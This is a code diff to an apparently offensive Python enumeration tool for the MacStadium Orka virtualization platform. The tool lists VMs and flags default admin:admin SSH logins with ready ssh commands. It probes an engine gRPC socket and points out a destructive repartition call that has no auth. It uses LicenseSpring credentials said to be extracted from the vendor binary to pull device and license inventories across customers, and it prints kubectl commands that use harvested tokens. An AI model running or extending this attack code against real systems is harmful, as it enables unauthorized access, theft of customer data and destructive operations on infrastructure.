-        """Check if Sentry RR-Web relay is running (localhost:8969/stream)"""
+        return bool(self.token)
+
+    def enumerate_vms(self):
+        """List VMs (requires auth)."""
+        if not self.token:
+            return []
+        headers = {'Authorization': f'Bearer {self.token}'}
+        for api_url in self.api_servers:
+            sc, _, get_json = _http_get(f'{api_url}/api/v1/namespaces', headers=headers, timeout=5)
+            if sc != 200:
+                continue
+            namespaces = get_json()
+            for ns in namespaces:
+                ns_name = ns.get('name', 'orka-default')
+                sc2, _, get_json2 = _http_get(
+                    f'{api_url}/api/v1/namespaces/{ns_name}/vms',
+                    headers=headers, timeout=5,
+                )
+                if sc2 != 200:
+                    continue
+                for vm in get_json2():
+                    self.vms.append({
+                        'name':     vm.get('vm_name'),
+                        'namespace': ns_name,
+                        'status':   vm.get('vm_status'),
+                        'ip':       vm.get('vnc_host'),
+                        'ssh_port': vm.get('ssh_port', 8822),
+                        'vnc_port': vm.get('vnc_port', 5999),
+                    })
+                    if vm.get('ssh_port'):
+                        self.findings.append({
+                            'type': 'VM with Default Credentials',
+                            'severity': 'CRITICAL',
+                            'description': f"VM {vm.get('vm_name')} likely has admin:admin (F2)",
+                            'detail': f"SSH: {vm.get('vnc_host')}:{vm.get('ssh_port', 8822)}",
+                            'exploit': f"ssh admin@{vm.get('vnc_host')} -p {vm.get('ssh_port', 8822)}",
+                        })
+        return self.vms
+
+    def enumerate_images(self):
+        """List images (requires auth)."""
+        if not self.token:
+            return []
+        headers = {'Authorization': f'Bearer {self.token}'}
+        for api_url in self.api_servers:
+            sc, _, get_json = _http_get(
+                f'{api_url}/api/v1/namespaces/orka-default/images',
+                headers=headers, timeout=5,
+            )
+            if sc == 200:
+                self.images = get_json()
+        return self.images
+
+    def enumerate_service_accounts(self):
+        """List service accounts (requires auth)."""
+        if not self.token:
+            return []
+        headers = {'Authorization': f'Bearer {self.token}'}
+        for api_url in self.api_servers:
+            sc, _, get_json = _http_get(
+                f'{api_url}/api/v1/namespaces/orka-default/serviceaccounts',
+                headers=headers, timeout=5,
+            )
+            if sc == 200:
+                self.service_accounts = get_json()
+        return self.service_accounts
+
+    # ── gRPC socket probes ───────────────────────────────────────────────────
+
+    def probe_engine_grpc_socket(self):
+        """Probe orka-engine Unix gRPC socket and check for specific RPCs (F98, F99)."""
+        result = {'engine_sock': False, 'repartition_check': False}
+
+        sock_path = ORKA_ENGINE_SOCK
+        if not Path(sock_path).exists():
+            return result
+
         try:
-            r = requests.get(SENTRY_STREAM_URL, timeout=1, stream=True)
-            if r.status_code in (200, 204):
-                self.findings.append({
-                    'type': 'Sentry RR-Web Stream Active',
-                    'severity': 'MEDIUM',
-                    'description': 'Orka engine is relaying session-replay events to Sentry at localhost:8969',
-                    'detail': SENTRY_STREAM_URL,
-                    'exploit': 'Intercept or inject events into Sentry relay stream'
-                })
-                return True
+            s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+            s.settimeout(1)
+            s.connect(sock_path)
+            s.sendall(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')
+            banner = s.recv(64)
+            s.close()
+            result['engine_sock'] = True
+            self.findings.append({
+                'type': 'Orka Engine gRPC Socket Accessible',
+                'severity': 'CRITICAL',
+                'description': f'Engine gRPC Unix socket readable without auth token (F99)',
+                'detail': (
+                    f'Socket: {sock_path} | Banner: {banner[:32]!r}\n'
+                    f'Services: VirtualMachineService ({len(ORKA_GRPC_SERVICES["VirtualMachineService"])} RPCs), '
+                    f'ImageService ({len(ORKA_GRPC_SERVICES["ImageService"])} RPCs), '
+                    f'SystemService ({len(ORKA_GRPC_SERVICES["SystemService"])} RPCs)'
+                ),
+                'exploit': (
+                    'Send protobuf RPCs: VMList (enumerate all VMs), VMStart, VMDelete, ImagePull. '
+                    'VirtualMachineRepartition (F98) is a destructive disk repartition op — '
+                    'no confirmation, no auth gate on socket.'
+                ),
+            })
         except Exception:
             pass
+
+        return result
+
+    # ── Sentry relay ─────────────────────────────────────────────────────────
+
+    def probe_sentry_stream(self):
+        """Check if Sentry RR-Web relay is running (localhost:8969/stream)."""
+        sc, _, _ = _http_get(SENTRY_STREAM_URL, timeout=1)
+        if sc in (200, 204):
+            self.findings.append({
+                'type': 'Sentry RR-Web Stream Active',
+                'severity': 'MEDIUM',
+                'description': 'Engine relays session-replay events to Sentry at localhost:8969 (F77)',
+                'detail': SENTRY_STREAM_URL,
+                'exploit': 'Intercept stream to observe gRPC call events, VM lifecycle, errors.',
+            })
+            return True
         return False
 
-    def _licensespring_auth(self, date_str):
-        """Build LicenseSpring HMAC-SHA256 Authorization header.
+    # ── LicenseSpring ────────────────────────────────────────────────────────
 
-        String-to-sign: "licenseSpring\\ndate: {RFC1123}"
-        Header format:  algorithm="hmac-sha256", headers="date", signature="{b64}", apiKey="{uuid}"
-        Confirmed against api.licensespring.com — returns HTTP 200.
+    def _licensespring_hmac_auth(self, date_str):
+        """Build LicenseSpring SDK HMAC-SHA256 Authorization header (F105).
+
+        SDK API v1 auth:
+          string-to-sign = "licenseSpring\\ndate: {RFC1123}"
+          signature      = base64(HMAC-SHA256(shared_key, string-to-sign))
+          header         = algorithm="hmac-sha256", headers="date",
+                           signature="{b64}", apiKey="{api_key}"
+
+        Note: apiKey = api_key (UUID2), NOT product_code.
         """
         msg = f"licenseSpring\ndate: {date_str}"
         sig = base64.b64encode(
@@ -477,173 +750,173 @@ class OrkaEnumerator:
         ).decode()
         return (
             f'algorithm="hmac-sha256", headers="date", '
-            f'signature="{sig}", apiKey="{LICENSESPRING_PRODUCT_UUID}"'
+            f'signature="{sig}", apiKey="{LICENSESPRING_API_KEY}"'
         )
 
+    def _licensespring_basic_auth(self):
+        """Build LicenseSpring Management API v4 Basic auth header (F105).
+
+        Management API v4 uses Basic auth: username=api_key, password=api_key.
+        """
+        creds = base64.b64encode(
+            f'{LICENSESPRING_API_KEY}:{LICENSESPRING_API_KEY}'.encode()
+        ).decode()
+        return f'Basic {creds}'
+
     def probe_licensespring(self):
-        """Enumerate LicenseSpring using credentials extracted from the Orka binary (F70)."""
+        """Enumerate LicenseSpring using credentials extracted from binary (F105)."""
         result = {
-            'uuid': LICENSESPRING_PRODUCT_UUID,
-            'shared_key': LICENSESPRING_SHARED_KEY[:8] + '...',
-            'reachable': False,
-            'auth_valid': False,
-            'product': {},
-            'check_license': {},
+            'api_key':       LICENSESPRING_API_KEY,
+            'product_code':  LICENSESPRING_PRODUCT_CODE,
+            'shared_key':    LICENSESPRING_SHARED_KEY[:8] + '...',
+            'sdk_auth_valid':  False,
+            'mgmt_auth_valid': False,
+            'product':         {},
+            'activations':     [],
         }
 
+        # Always report the hardcoded credential finding
+        self.findings.append({
+            'type': 'LicenseSpring Credentials Hardcoded in Binary (F105)',
+            'severity': 'CRITICAL',
+            'description': (
+                'All three LicenseSpring SDK credentials hardcoded in orka-engine-3.5.2 binary '
+                '(api_key + product_code + shared_key, stored contiguously at offset ~0x8ed000)'
+            ),
+            'detail': (
+                f'api_key:      {LICENSESPRING_API_KEY}\n'
+                f'product_code: {LICENSESPRING_PRODUCT_CODE}\n'
+                f'shared_key:   {LICENSESPRING_SHARED_KEY}'
+            ),
+            'exploit': (
+                'SDK credentials enable: license activation for any hardware_id, '
+                'check_license/ to retrieve bound hardware_ids (node inventory), '
+                'enumerate activated Orka nodes across all customers.'
+            ),
+        })
+
+        # Probe SDK API v1 (HMAC auth)
         date_str = datetime.now(timezone.utc).strftime('%a, %d %b %Y %H:%M:%S GMT')
-        auth = self._licensespring_auth(date_str)
-        headers = {'Authorization': auth, 'Date': date_str, 'Accept': 'application/json'}
-
-        endpoints = {
-            'product': '/api/v4/product_details/?product=Orka',
-            'products_list': '/api/v4/products/',
+        hmac_headers = {
+            'Authorization': self._licensespring_hmac_auth(date_str),
+            'Date': date_str,
+            'Accept': 'application/json',
         }
+        sdk_endpoints = {
+            'product_details': f'/api/v4/product_details/?product={LICENSESPRING_PRODUCT_CODE}',
+            'products_list':   '/api/v4/products/',
+        }
+        for key, ep in sdk_endpoints.items():
+            sc, body, get_json = _http_get(f'{LICENSESPRING_API}{ep}', headers=hmac_headers, timeout=5)
+            if sc == 200:
+                result['sdk_auth_valid'] = True
+                result[key] = get_json()
 
-        for key, ep in endpoints.items():
-            try:
-                r = requests.get(f'{LICENSESPRING_API}{ep}', headers=headers, timeout=5)
-                result['reachable'] = True
-                if r.status_code == 200:
-                    result['auth_valid'] = True
-                    result[key] = r.json()
-            except Exception:
-                pass
+        # Probe Management API v4 (Basic auth)
+        basic_headers = {
+            'Authorization': self._licensespring_basic_auth(),
+            'Accept': 'application/json',
+        }
+        mgmt_endpoints = {
+            'mgmt_product': f'/api/v4/product_details/?product={LICENSESPRING_PRODUCT_CODE}',
+            'mgmt_devices':  '/api/v4/device/?limit=100',
+            'mgmt_licenses': '/api/v4/license/?limit=100',
+        }
+        for key, ep in mgmt_endpoints.items():
+            sc, body, get_json = _http_get(f'{LICENSESPRING_API}{ep}', headers=basic_headers, timeout=5)
+            if sc == 200:
+                result['mgmt_auth_valid'] = True
+                result[key] = get_json()
 
-        if result['auth_valid']:
+        if result['sdk_auth_valid'] or result['mgmt_auth_valid']:
             self.findings.append({
                 'type': 'LicenseSpring API Auth Confirmed (HTTP 200)',
                 'severity': 'CRITICAL',
-                'description': 'Hardcoded shared key from Orka binary authenticates to LicenseSpring API',
+                'description': 'Hardcoded credentials from Orka binary authenticate to LicenseSpring API',
                 'detail': (
-                    f"Product: {result.get('product', {}).get('product_name', 'N/A')} | "
-                    f"Short code: {result.get('product', {}).get('short_code', 'N/A')} | "
-                    f"Max activations: {result.get('product', {}).get('max_activations', 'N/A')}"
+                    f"SDK auth: {result['sdk_auth_valid']} | "
+                    f"Mgmt auth: {result['mgmt_auth_valid']} | "
+                    f"Product: {result.get('product_details', {}).get('product_name', 'N/A')}"
                 ),
                 'exploit': (
-                    'With ORKA_ENGINE_LICENSE_KEY (any active key), call check_license/ to retrieve '
-                    'hardware_id (device fingerprint: MAC/MLB ID) bound to that license. '
-                    'Full customer node inventory if license keys are enumerable.'
-                )
+                    'POST /api/v4/check_license/ with any ORKA_ENGINE_LICENSE_KEY value → '
+                    'retrieve hardware_id (MLB serial) of the Mac node that activated it. '
+                    'GET /api/v4/device/?limit=100 → full inventory of all activated Orka nodes.'
+                ),
             })
 
-        self.findings.append({
-            'type': 'LicenseSpring Credentials Hardcoded in Public Binary',
-            'severity': 'CRITICAL',
-            'description': 'Product UUID + HMAC shared key hardcoded in orka-engine-3.5.2.pkg (public download)',
-            'detail': f'UUID: {LICENSESPRING_PRODUCT_UUID} | Key: {LICENSESPRING_SHARED_KEY[:8]}...',
-            'exploit': (
-                'Download pkg from distribution.macstadium.com, extract strings at offset 9425568. '
-                'Sign requests: msg="licenseSpring\\ndate: {RFC1123}", HMAC-SHA256 with shared key.'
-            )
-        })
         return result
 
-    def check_engine_install(self):
-        """Detect orka-engine installation on current macOS host"""
-        indicators = {
-            'binary': Path('/usr/local/libexec/orka-engine.app/Contents/MacOS/com.macstadium.orka-engine.server').exists(),
-            'runner': Path('/usr/local/libexec/orka-engine.app/Contents/Helpers/Orka Engine Runner.app').exists(),
-            'sock': Path(ORKA_ENGINE_SOCK).exists(),
-            'plist': Path(f'/Library/LaunchDaemons/com.macstadium.orka-engine.server.managed.plist').exists(),
-            'helper': Path('/usr/local/bin/orka-engine').exists(),
-            'state_dir': Path('/opt/orka').exists(),
-            'log': Path('/opt/orka/logs/com.macstadium.orka-engine.server.managed.log').exists(),
-        }
-
-        if indicators['binary']:
-            self.findings.append({
-                'type': 'Orka Engine Installed',
-                'severity': 'INFO',
-                'description': 'orka-engine.server daemon present on this host',
-                'detail': f"Team: {ORKA_TEAM_ID} | Keychain group: {ORKA_KEYCHAIN_GROUP}",
-                'exploit': 'Engine holds com.apple.vm.networking entitlement + keychain-access-groups=23KP83Z488.* (all MacStadium keychain items readable by engine process)'
-            })
-
-        if indicators['log']:
-            self.findings.append({
-                'type': 'Orka Engine Log Readable',
-                'severity': 'LOW',
-                'description': 'Engine log may contain license keys, gRPC errors, image paths',
-                'detail': '/opt/orka/logs/com.macstadium.orka-engine.server.managed.log',
-                'exploit': 'Read log for license key leakage, failed auth attempts with tokens'
-            })
-
-        return indicators
+    # ── Post-auth checks ──────────────────────────────────────────────────────
 
     def check_security_issues(self):
-        """Check for known Orka security issues"""
-        # F4: Orka Auth = K8s Auth
+        """Post-auth security checks (requires valid token)."""
         if self.token:
             self.findings.append({
                 'type': 'Orka Token = K8s Token',
                 'severity': 'HIGH',
-                'description': 'Orka tokens are Kubernetes service account tokens (F4)',
+                'description': 'Orka tokens are K8s service account tokens (F4)',
                 'detail': 'Valid token grants direct kubectl access to cluster',
-                'exploit': 'Use token with kubectl to access K8s API directly'
+                'exploit': (
+                    f'kubectl --server={self.cluster_info.get("apiEndpoint", "https://API") if self.cluster_info else "https://API"} '
+                    f'--token=<token> get pods --all-namespaces'
+                ),
             })
 
-        # Check for /debug/pprof on metadata server (F3)
-        if self.in_orka_vm:
-            try:
-                response = requests.get('http://169.254.169.254/debug/pprof/', timeout=2)
-                if response.status_code == 200:
-                    self.findings.append({
-                        'type': 'Debug Endpoint Exposed',
-                        'severity': 'MEDIUM',
-                        'description': 'Go pprof debug endpoint exposed on metadata server',
-                        'detail': 'http://169.254.169.254/debug/pprof/',
-                        'exploit': 'Memory profiling, goroutine dumps available'
-                    })
-            except:
-                pass
+    # ── Report ────────────────────────────────────────────────────────────────
 
-        # RE-derived checks
-        self.check_engine_install()
-        self.probe_engine_grpc_socket()
-        self.probe_sentry_stream()
-        self.probe_licensespring()
-    
     def report(self):
-        """Generate human-readable report"""
+        """Generate human-readable report."""
         lines = []
-        lines.append("="*60)
-        lines.append("ORKA PLATFORM ENUMERATION")
-        lines.append("="*60)
-        
-        lines.append(f"\nIn Orka VM: {self.in_orka_vm}")
-        lines.append(f"Orka API Reachable: {self.orka_api_reachable}")
-        lines.append(f"Authenticated: {bool(self.token)}")
-        
+        lines.append('=' * 60)
+        lines.append('ORKA PLATFORM ENUMERATION')
+        lines.append('=' * 60)
+
+        lines.append(f'\nIn Orka VM:      {self.in_orka_vm}')
+        lines.append(f'On Orka Node:    {self.on_orka_node}')
+        lines.append(f'API Reachable:   {self.orka_api_reachable}')
+        lines.append(f'Authenticated:   {bool(self.token)}')
+
         if self.metadata_server:
-            lines.append(f"\nMetadata Server: Available")
-            lines.append(f"  Keys: {len(self.metadata_server.get('keys', []))}")
-        
+            keys = self.metadata_server.get('keys', [])
+            lines.append(f'\nMetadata Server: {len(keys)} keys')
+            for k in keys[:10]:
+                lines.append(f'  {k}: {self.metadata_server["metadata"].get(k, "")[:60]}')
+
         if self.cluster_info:
-            lines.append(f"\nCluster Info (Unauthenticated):")
-            lines.append(f"  K8s API: {self.cluster_info.get('apiEndpoint', 'N/A')}")
-            lines.append(f"  OAuth: {self.cluster_info.get('baseOauthEndpoint', 'N/A')}")
-        
+            lines.append(f'\nCluster Info (unauthenticated):')
+            lines.append(f'  K8s API: {self.cluster_info.get("apiEndpoint", "N/A")}')
+            lines.append(f'  OAuth:   {self.cluster_info.get("baseOauthEndpoint", "N/A")}')
+
         if self.vms:
-            lines.append(f"\nVMs: {len(self.vms)}")
-            for vm in self.vms[:5]:
-                lines.append(f"  {vm['name']} - {vm['ip']}:{vm.get('ssh_port', 8822)} ({vm['status']})")
-        
+            lines.append(f'\nVMs ({len(self.vms)}):')
+            for vm in self.vms[:10]:
+                lines.append(
+                    f'  {vm["name"]} | {vm["ip"]}:{vm.get("ssh_port", 8822)} '
+                    f'| {vm["status"]}'
+                )
+
         if self.images:
-            lines.append(f"\nImages: {len(self.images)}")
-        
-        if self.service_accounts:
-            lines.append(f"\nService Accounts: {len(self.service_accounts)}")
-        
+            lines.append(f'\nImages: {len(self.images)}')
+
         if self.findings:
-            lines.append(f"\nSecurity Findings: {len(self.findings)}")
-            for finding in self.findings:
-                lines.append(f"  [{finding['severity']}] {finding['type']}")
-                lines.append(f"    {finding['description']}")
-                if 'detail' in finding:
-                    lines.append(f"    {finding['detail']}")
-        
-        return "\n".join(lines)
+            crit  = [f for f in self.findings if f['severity'] == 'CRITICAL']
+            high  = [f for f in self.findings if f['severity'] == 'HIGH']
+            other = [f for f in self.findings if f['severity'] not in ('CRITICAL', 'HIGH')]
+
+            lines.append(f'\nFindings: {len(self.findings)} total '
+                         f'({len(crit)} CRITICAL, {len(high)} HIGH, {len(other)} other)')
+            for f in (crit + high + other):
+                lines.append(f'\n  [{f["severity"]}] {f["type"]}')
+                lines.append(f'  {f["description"]}')
+                if 'detail' in f:
+                    for detail_line in f['detail'].splitlines():
+                        lines.append(f'    {detail_line}')
+                if 'exploit' in f:
+                    lines.append(f'  EXPLOIT: {f["exploit"][:120]}')
+
+        return '\n'.join(lines)
+
 
 if __name__ == '__main__':
     enum = OrkaEnumerator()
